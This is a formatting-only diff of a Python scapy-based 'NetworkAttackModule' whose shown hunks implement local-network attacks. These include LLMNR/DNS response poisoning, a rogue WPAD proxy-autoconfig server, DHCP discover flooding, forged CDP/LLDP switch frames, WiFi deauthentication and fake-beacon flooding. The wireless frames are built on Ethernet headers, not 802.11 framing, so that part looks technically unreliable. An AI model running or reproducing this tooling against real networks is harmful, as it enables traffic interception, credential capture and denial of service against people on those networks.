@@ -18,13 +18,28 @@ from datetime import datetime
 
 try:
     from scapy.all import (
-        Ether, ARP, IP, UDP, DNS, DNSRR, Raw,
-        send, sendp, sniff,
+        Ether,
+        ARP,
+        IP,
+        UDP,
+        DNS,
+        DNSRR,
+        Raw,
+        send,
+        sendp,
+        sniff,
         get_if_list,
-        IPv6, ICMPv6ND_RS, ICMPv6ND_RA, ICMPv6NDOptDstLLAddr,
-        Dot1Q, LLC, STP,
-        DHCP, BOOTP,
+        IPv6,
+        ICMPv6ND_RS,
+        ICMPv6ND_RA,
+        ICMPv6NDOptDstLLAddr,
+        Dot1Q,
+        LLC,
+        STP,
+        DHCP,
+        BOOTP,
     )
+
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -88,9 +103,14 @@ class NetworkAttackModule:
 
     def _random_mac(self):
         """Generate a random locally-administered MAC address"""
-        mac = [0x02, random.randint(0x00, 0x7F),
-               random.randint(0x00, 0xFF), random.randint(0x00, 0xFF),
-               random.randint(0x00, 0xFF), random.randint(0x00, 0xFF)]
+        mac = [
+            0x02,
+            random.randint(0x00, 0x7F),
+            random.randint(0x00, 0xFF),
+            random.randint(0x00, 0xFF),
+            random.randint(0x00, 0xFF),
+            random.randint(0x00, 0xFF),
+        ]
         return ":".join(f"{b:02x}" for b in mac)
 
     # ──────────────────────────────────────────────────────────
@@ -232,7 +252,8 @@ class NetworkAttackModule:
                                 / IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                 / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                 / DNS(
-                                    id=pkt[DNS].id, qr=1,
+                                    id=pkt[DNS].id,
+                                    qr=1,
                                     qd=pkt[DNS].qd,
                                     an=DNSRR(rrname=qname, rdata=my_ip),
                                 )
@@ -240,11 +261,13 @@ class NetworkAttackModule:
                             sendp(resp, iface=interface, verbose=False)
                             self.log(f"[LLMNR] Poisoned response for {qname}", "success")
                             with self._lock:
-                                self.results.setdefault("llmnr_nbtns_captures", []).append({
-                                    "name": qname,
-                                    "resolved_to": my_ip,
-                                    "timestamp": datetime.now().isoformat(),
-                                })
+                                self.results.setdefault("llmnr_nbtns_captures", []).append(
+                                    {
+                                        "name": qname,
+                                        "resolved_to": my_ip,
+                                        "timestamp": datetime.now().isoformat(),
+                                    }
+                                )
                 except Exception:
                     time.sleep(0.5)
 
@@ -268,9 +291,7 @@ class NetworkAttackModule:
         wpad_port = 80
 
         pac_content = (
-            'function FindProxyForURL(url, host) {\n'
-            '  return "PROXY %(proxy_ip)s:%(proxy_port)s; DIRECT";\n'
-            '}\n'
+            'function FindProxyForURL(url, host) {\n  return "PROXY %(proxy_ip)s:%(proxy_port)s; DIRECT";\n}\n'
         )
 
         my_ip = self._get_local_ip(interface)
@@ -298,8 +319,7 @@ class NetworkAttackModule:
                             response = (
                                 "HTTP/1.1 200 OK\r\n"
                                 "Content-Type: application/x-ns-proxy-autoconfig\r\n"
-                                f"Content-Length: {len(pac_file)}\r\n\r\n"
-                                + pac_file
+                                f"Content-Length: {len(pac_file)}\r\n\r\n" + pac_file
                             )
                             conn.sendall(response.encode())
                             self.log(f"[WPAD] PAC served to {addr[0]}", "success")
@@ -351,8 +371,11 @@ class NetworkAttackModule:
                         / IP(src="0.0.0.0", dst="255.255.255.255")
                         / UDP(sport=68, dport=67)
                         / BOOTP(
-                            op=1, htype=1, hlen=6,
-                            xid=xid, chaddr=bytes.fromhex(mac.replace(":", "")),
+                            op=1,
+                            htype=1,
+                            hlen=6,
+                            xid=xid,
+                            chaddr=bytes.fromhex(mac.replace(":", "")),
                         )
                         / DHCP(options=[("message-type", "discover"), ("end",)])
                     )
@@ -541,28 +564,29 @@ class NetworkAttackModule:
                     cdp_payload = (
                         b"\x01"  # version
                         b"\x00\x0c"  # TTL
-                        + b"\x00\x05" + b"Switch"  # device-id TLV
-                        + b"\x00\x03" + b"Gi0/1"  # port-id TLV
-                        + b"\x00\x04" + b"\x01"  # capabilities
+                        + b"\x00\x05"
+                        + b"Switch"  # device-id TLV
+                        + b"\x00\x03"
+                        + b"Gi0/1"  # port-id TLV
+                        + b"\x00\x04"
+                        + b"\x01"  # capabilities
                     )
-                    pkt = (
-                        Ether(dst="01:00:0c:cc:cc:cc", src=self._random_mac(), type=0x2000)
-                        / Raw(load=cdp_payload)
-                    )
+                    pkt = Ether(dst="01:00:0c:cc:cc:cc", src=self._random_mac(), type=0x2000) / Raw(load=cdp_payload)
                     sendp(pkt, iface=interface, verbose=False)
 
                     # LLDP-like frame
                     lldp_payload = (
-                        b"\x02\x07" + b"sw-core"  # chassis ID
-                        + b"\x04\x07" + b"Gi0/1"  # port ID
-                        + b"\x06\x02" + b"\x00\x78"  # TTL 120
-                        + b"\x08\x05" + b"Switch"  # sys name
+                        b"\x02\x07"
+                        + b"sw-core"  # chassis ID
+                        + b"\x04\x07"
+                        + b"Gi0/1"  # port ID
+                        + b"\x06\x02"
+                        + b"\x00\x78"  # TTL 120
+                        + b"\x08\x05"
+                        + b"Switch"  # sys name
                         + b"\x00\x00"  # end
                     )
-                    pkt2 = (
-                        Ether(dst="01:80:c2:00:00:0e", src=self._random_mac(), type=0x88cc)
-                        / Raw(load=lldp_payload)
-                    )
+                    pkt2 = Ether(dst="01:80:c2:00:00:0e", src=self._random_mac(), type=0x88CC) / Raw(load=lldp_payload)
                     sendp(pkt2, iface=interface, verbose=False)
                     self.log("[CDP] Forged CDP+LLDP frames sent", "success")
                     time.sleep(5)
@@ -997,13 +1021,11 @@ class NetworkAttackModule:
                 self.run_command(f"airport --channel={channel}")
             else:
                 self.run_command(f"iwconfig {interface} channel {channel}")
-            self.log(f"[WiFi-DEAUTH] Sending deauth frames…", "info")
+            self.log("[WiFi-DEAUTH] Sending deauth frames…", "info")
             while self.is_running:
                 try:
-                    deauth = (
-                        Ether(dst=bssid, src="ff:ff:ff:ff:ff:ff")
-                        / Raw(load=b"\x00\x03\x00\x00\x00" + bytes.fromhex(bssid.replace(":", "")) * 2
-                              + b"\x00\x07")
+                    deauth = Ether(dst=bssid, src="ff:ff:ff:ff:ff:ff") / Raw(
+                        load=b"\x00\x03\x00\x00\x00" + bytes.fromhex(bssid.replace(":", "")) * 2 + b"\x00\x07"
                     )
                     sendp(deauth, iface=interface, verbose=False)
                     count += 1
@@ -1043,23 +1065,20 @@ class NetworkAttackModule:
             while self.is_running:
                 try:
                     fake_mac = self._random_mac()
-                    name = f"{ssid}-{random.randint(1000,9999)}"
-                    beacon = (
-                        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
-                        / Raw(
-                            load=(
-                                b"\x00\x00"  # Beacon
-                                + b"\xff\xff\xff\xff\xff\xff"
-                                + bytes.fromhex(fake_mac.replace(":", ""))
-                                + bytes.fromhex(fake_mac.replace(":", ""))
-                                + b"\x00\x00"
-                                + b"\x00\x00\x00\x00\x00\x00"
-                                + b"\x64\x00"  # Beacon interval
-                                + b"\x31\x04"  # Capability info
-                                + b"\x00" * 12  # SSID padding
-                                + bytes([len(name)])
-                                + name.encode()
-                            )
+                    name = f"{ssid}-{random.randint(1000, 9999)}"
+                    beacon = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / Raw(
+                        load=(
+                            b"\x00\x00"  # Beacon
+                            + b"\xff\xff\xff\xff\xff\xff"
+                            + bytes.fromhex(fake_mac.replace(":", ""))
+                            + bytes.fromhex(fake_mac.replace(":", ""))
+                            + b"\x00\x00"
+                            + b"\x00\x00\x00\x00\x00\x00"
+                            + b"\x64\x00"  # Beacon interval
+                            + b"\x31\x04"  # Capability info
+                            + b"\x00" * 12  # SSID padding
+                            + bytes([len(name)])
+                            + name.encode()
                         )
                     )
                     sendp(beacon, iface=interface, verbose=False)
@@ -1252,8 +1271,7 @@ class NetworkAttackModule:
         self._disable_ip_forward()
 
         if platform.system() == "Windows":
-            procs = ["arpspoof.exe", "bettercap.exe", "tcpdump.exe", "yersinia.exe",
-                      "dnsmasq.exe", "airbase-ng.exe"]
+            procs = ["arpspoof.exe", "bettercap.exe", "tcpdump.exe", "yersinia.exe", "dnsmasq.exe", "airbase-ng.exe"]
         else:
             procs = ["arpspoof", "bettercap", "tcpdump", "yersinia", "dnsmasq", "airbase-ng"]
 
